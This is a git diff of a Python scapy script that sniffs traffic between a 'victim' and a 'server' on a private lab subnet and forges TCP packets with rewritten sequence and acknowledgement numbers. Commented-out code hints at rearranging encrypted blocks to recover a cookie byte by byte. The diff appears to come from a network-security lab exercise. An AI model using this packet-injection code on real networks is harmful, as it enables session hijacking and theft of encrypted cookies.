@@ -3,10 +3,7 @@ import sys
 import os
 import time
 
-victim_ip = "192.168.10.4"
-victim_mac = "02:42:ac:11:00:01"
-server_ip = "192.168.10.2"
-server_mac = "02:42:ac:11:00:00"
+fake_packet = {}
 
 # def run_script(cookie):
 #     for i in range(16):
@@ -18,16 +15,16 @@ server_mac = "02:42:ac:11:00:00"
 
 # def find_byte():
 
-
 def parse_packet(packet):
-    if packet.haslayer(Raw) and packet.haslayer(IP):
+    global fake_packet
+    if True:
         print("-----------------------------------------")
-        print('-=-=-=-=-' + str(len(packet[Raw].load)) + '-=-=-=-=-')
-        if len(packet[Raw].load) == 394:
-            print_packet(packet)
-            #forge_packet(packet, 0)
-        else:
-            packet.show()
+        packet.show()
+        # if packet[IP].src == victim_ip and len(packet[Raw].load) == 394:
+        #     fake_packet = packet
+        #     print("updated packet")
+        # if packet[IP].src == server_ip and len(packet[Raw].load) == 586:
+        #     forge_packet(packet, 0)
         print("-----------------------------------------")
 
 
@@ -36,13 +33,15 @@ def print_packet(packet):
     print([hex(i) for i in packet])
 
 def forge_packet(packet, i):
-    new_packet = packet[Raw].load
+    #new_packet = packet[Raw].load
     #new_packet = new_packet[:-16] + new_packet[16 * i : 16 * (i + 1) - 1] + new_packet[-1]   
     #new_packet = new_packet[:-16] + new_packet[16 * i : 16 * (i + 1)]
     #packet[Raw].load = new_packet
-    time.sleep(10)
+    fake_packet[TCP].ack = packet[TCP].seq + len(packet[Raw].load)
+    fake_packet[TCP].seq = packet[TCP].ack
     print('scapy sending packet')
-    send(packet)
+    fake_packet.show()
+    send(fake_packet)
 
 
 print('sniff started')
